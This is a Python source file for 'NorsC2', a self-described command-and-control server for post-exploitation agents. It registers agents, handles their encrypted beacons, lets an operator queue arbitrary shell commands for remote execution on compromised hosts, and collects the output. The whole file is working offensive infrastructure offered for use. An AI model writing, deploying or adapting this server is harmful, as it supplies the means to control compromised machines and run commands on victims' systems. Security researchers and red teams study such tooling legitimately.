#!/usr/bin/env python3
# NorsC2 - Advanced Command & Control Server
# License: GPLv3
# Description: A sophisticated C2 server for managing post-exploitation agents with E2E encryption.

import asyncio
import json
import base64
from cryptography.fernet import Fernet
from aiohttp import web
from datetime import datetime
import uuid

# Configuration
HOST = '0.0.0.0'
PORT = 8443
SECRET_KEY = Fernet.generate_key()
cipher_suite = Fernet(SECRET_KEY)

agents = {}
tasks = {}

async def handle_register(request):
    try:
        data = await request.json()
        encrypted_info = data.get('payload')
        decrypted_info = cipher_suite.decrypt(encrypted_info.encode()).decode()
        info = json.loads(decrypted_info)
        
        agent_id = str(uuid.uuid4())
        info['last_seen'] = datetime.now().isoformat()
        agents[agent_id] = info
        tasks[agent_id] = []
        
        print(f"[+] New Agent Registered: {agent_id} | OS: {info.get('os')} | IP: {request.remote}")
        
        response_payload = cipher_suite.encrypt(json.dumps({"agent_id": agent_id}).encode()).decode()
        return web.json_response({"status": "success", "payload": response_payload})
    except Exception as e:
        print(f"[-] Registration Error: {e}")
        return web.json_response({"status": "error"}, status=400)

async def handle_beacon(request):
    try:
        data = await request.json()
        agent_id = data.get('agent_id')
        
        if agent_id not in agents:
            return web.json_response({"status": "unregistered"}, status=401)
            
        agents[agent_id]['last_seen'] = datetime.now().isoformat()
        
        # Check for pending tasks
        pending = tasks.get(agent_id, [])
        tasks[agent_id] = [] # Clear tasks once sent
        
        response_payload = cipher_suite.encrypt(json.dumps({"tasks": pending}).encode()).decode()
        return web.json_response({"status": "success", "payload": response_payload})
    except Exception as e:
        return web.json_response({"status": "error"}, status=400)

async def handle_result(request):
    try:
        data = await request.json()
        agent_id = data.get('agent_id')
        encrypted_result = data.get('payload')
        
        decrypted_result = cipher_suite.decrypt(encrypted_result.encode()).decode()
        result_info = json.loads(decrypted_result)
        
        print(f"\n[*] Result from {agent_id}:")
        print(f"Task ID: {result_info.get('task_id')}")
        print(f"Output:\n{result_info.get('output')}\n")
        
        return web.json_response({"status": "success"})
    except Exception as e:
        return web.json_response({"status": "error"}, status=400)

# CLI for the Operator
async def operator_console():
    await asyncio.sleep(1) # Let server start
    print(f"\n🦅 NorsC2 Server Started on {HOST}:{PORT}")
    print(f"🔑 Secret Key (Embed in Agents): {SECRET_KEY.decode()}")
    print("Type 'help' for commands.")
    
    while True:
        cmd = await asyncio.get_event_loop().run_in_executor(None, input, "NorsC2> ")
        parts = cmd.split()
        if not parts: continue
        
        if parts[0] == 'help':
            print("Commands:")
            print("  list            - List registered agents")
            print("  task <id> <cmd> - Assign shell command to agent")
            print("  key             - Show encryption key")
            print("  exit            - Stop C2 server")
        elif parts[0] == 'list':
            for aid, info in agents.items():
                print(f"ID: {aid} | User: {info.get('user')} | OS: {info.get('os')} | Last Seen: {info.get('last_seen')}")
        elif parts[0] == 'task' and len(parts) >= 3:
            aid = parts[1]
            if aid in tasks:
                command = " ".join(parts[2:])
                task_id = str(uuid.uuid4())[:8]
                tasks[aid].append({"task_id": task_id, "type": "shell", "command": command})
                print(f"[+] Task {task_id} queued for {aid}")
            else:
                print("[-] Agent not found.")
        elif parts[0] == 'key':
            print(f"🔑 {SECRET_KEY.decode()}")
        elif parts[0] == 'exit':
            print("[*] Shutting down...")
            sys.exit(0)

app = web.Application()
app.router.add_post('/api/v1/register', handle_register)
app.router.add_post('/api/v1/beacon', handle_beacon)
app.router.add_post('/api/v1/result', handle_result)

if __name__ == '__main__':
    import sys
    loop = asyncio.get_event_loop()
    runner = web.AppRunner(app)
    loop.run_until_complete(runner.setup())
    site = web.TCPSite(runner, HOST, PORT)
    loop.run_until_complete(site.start())
    
    try:
        loop.run_until_complete(operator_console())
    except KeyboardInterrupt:
        pass
